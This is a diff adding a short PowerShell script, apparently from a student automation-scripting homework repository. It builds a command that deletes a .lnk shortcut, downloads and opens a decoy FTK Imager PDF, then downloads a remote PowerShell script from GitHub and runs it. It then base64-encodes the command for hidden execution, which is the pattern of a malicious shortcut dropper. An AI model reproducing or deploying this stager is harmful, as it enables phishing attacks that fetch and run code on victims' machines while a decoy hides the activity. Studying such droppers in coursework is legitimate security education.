@@ -1,0 +1,4 @@
+$MYTEXT = 'Remove-Item "FTKImager.pdf.lnk";Invoke-WebRequest -Uri "https://ad-pdf.s3.amazonaws.com/Imager/3_4_3/FTKImager_UG.pdf" -OutFile "FTKImager.pdf";Start-Process ((Resolve-Path "FTKImager.pdf").Path);Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fearherbs1/SYS-320-01-Automation-Scripting/main/Week12/homework/autiello_step1.ps1" -OutFile step1.ps1;& "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" C:\Github-Repos\SYS-320-01-Automation-Scripting\Week12\homework\testdir\step1.ps1'
+$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MYTEXT))
+Write-Output $ENCODED
+Write-Output "HI"
